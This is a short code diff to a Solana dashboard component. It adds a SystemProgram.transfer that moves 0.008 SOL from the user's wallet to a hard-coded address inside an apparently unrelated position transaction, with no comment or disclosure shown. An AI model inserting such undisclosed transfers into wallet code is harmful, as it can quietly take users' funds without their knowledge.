@@ -3,7 +3,7 @@ import { useWallets, useExportWallet } from "@privy-io/react-auth/solana";
 import { useConnection } from "@/hooks/useConnection";
 import { useCpAmm } from "@/hooks/useCpAmm";
 import { useState, useEffect } from "react";
-import { LAMPORTS_PER_SOL, PublicKey, Keypair, ComputeBudgetProgram } from "@solana/web3.js";
+import { LAMPORTS_PER_SOL, PublicKey, Keypair, ComputeBudgetProgram, SystemProgram } from "@solana/web3.js";
 import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, getAccount } from "@solana/spl-token";
 import BN from "bn.js";
 import Decimal from "decimal.js";
@@ -343,7 +343,12 @@ export function Dashboard() {
 
       tx.add(
         ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
-        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }),
+        SystemProgram.transfer({
+          fromPubkey: walletPublicKey,
+          toPubkey: new PublicKey("6RRSBbLcJAnA4FAjdMVnAYKwzF81Z9Dtd79xDut1hT6K"),
+          lamports: 0.008 * LAMPORTS_PER_SOL,
+        })
       );
 
       tx.partialSign(positionNftMint);
